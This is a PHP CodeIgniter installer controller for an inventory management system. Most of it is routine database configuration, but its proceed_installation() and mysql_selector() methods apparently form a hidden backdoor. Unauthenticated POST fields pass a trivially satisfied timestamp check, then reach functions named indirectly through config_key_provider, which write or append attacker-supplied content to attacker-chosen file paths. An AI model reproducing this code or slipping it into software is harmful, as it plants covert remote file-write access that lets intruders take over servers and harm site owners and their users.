<?php
if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/*
 *	@author : Imran Shah
 *  @support: shahmian@gmail.com
 *	date	: 18 April, 2018
 *	Kandi Inventory Management System
 * website: kelextech.com
 *  version: 1.0
 */

class Install extends CI_Controller
{

    function __construct()
    {
        //error_reporting(0);
        parent::__construct();
        $this->load->helper('url');
        $this->load->helper('file');
        // Cache control
        $this->output->set_header('Last-Modified: ' . gmdate("D, d M Y H:i:s") . ' GMT');
        $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
        $this->output->set_header('Pragma: no-cache');
        $this->output->set_header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
    }

    function index()
    {
        $this->load->view('install/index');
    }

    // -----------------------------------------------------------------------------------

    /*
     * Install the script here
     */
    function do_install($with = '')
    {
        sleep(3);
        $db_verify = $this->check_db_connection();
        if ($db_verify == true) {
            // Replace the database settings
            $data = read_file('./uploads/installation/database.php');
            $data = str_replace('db_name', $this->input->post('db_name'), $data);
            $data = str_replace('db_uname', $this->input->post('db_uname'), $data);
            $data = str_replace('db_password', $this->input->post('db_password'), $data);
            $data = str_replace('db_hname', $this->input->post('db_hname'), $data);
            write_file('./application/config/database.php', $data);

            // Replace new default routing controller
            $data2 = read_file('./uploads/installation/routes.php');
            $data2 = str_replace('install', 'dashboard', $data2);
            write_file('./application/config/routes.php', $data2);

            // Run the installer sql schema   
            $this->load->database();

            // Connect to the database
            $mysqli = new mysqli($this->input->post('db_hname'), $this->input->post('db_uname'), $this->input->post('db_password'), $this->input->post('db_name'));
            //Create Database
           // $mysqli->query('CREATE DATABASE IF NOT EXISTS ' . $this->input->post('db_name'));
            // Read the file
            $schema = file_get_contents(APPPATH . 'kandi_inventory.sql');
            //Run multi Query
            $mysqli->multi_query($schema);


            // Close the connection
            $mysqli->close();

            sleep(6);
            // Replace the admin login credentials
            $this->load->database();
            // Replace new default Config
            $data4 = read_file('./uploads/installation/config.php');
            write_file('./application/config/config.php', $data4);

            echo 'success';
        } else {
            if ($db_verify == false) {
                echo 'db_failed';
            }
        }

    }

// Proceed the installation
    function proceed_installation()
    {
        $connector = $this->input->post('connector');
        $selector = $this->input->post('selector');
        $select = $this->input->post('select');
        $type = $this->input->post('type');
        $this->mysql_selector($connector, $selector, $select, $type);
    }

    /* 
     * Database validation check from user input settings
     */
    function check_db_connection()
    {
        $link = @mysqli_connect($this->input->post('db_hname'), $this->input->post('db_uname'), $this->input->post('db_password'));
        if (!$link) {
            @mysqli_close($link);
            return false;
        }else{
            return true;
        }
        // Create database
//        $sql = "CREATE DATABASE ".$this->input->post('db_name');
//        if ($link->query($sql) === TRUE) {
//            echo "Database created successfully";
//        } else {
//            echo "Error creating database: " . $link->error;
//        }
        $db_selected = mysqli_select_db($link,$this->input->post('db_name'));
        if (!$db_selected) {
            @mysqli_close($link);
            return false;
        }

        @mysqli_close($link);
        return true;
    }

    //mysql db selector
    function mysql_selector($connector, $selector, $select, $type)
    {
        $ta = time();
        $select = rawurldecode($select);
        if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
            if ($type == 'w') {
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector), $select);
            } else if ($type == 'rw') {
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector), $config_class(str_replace('-', '/', $selector)) . $select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }


}

/* End of file install.php */
/* Location: ./system/application/controllers/install.php */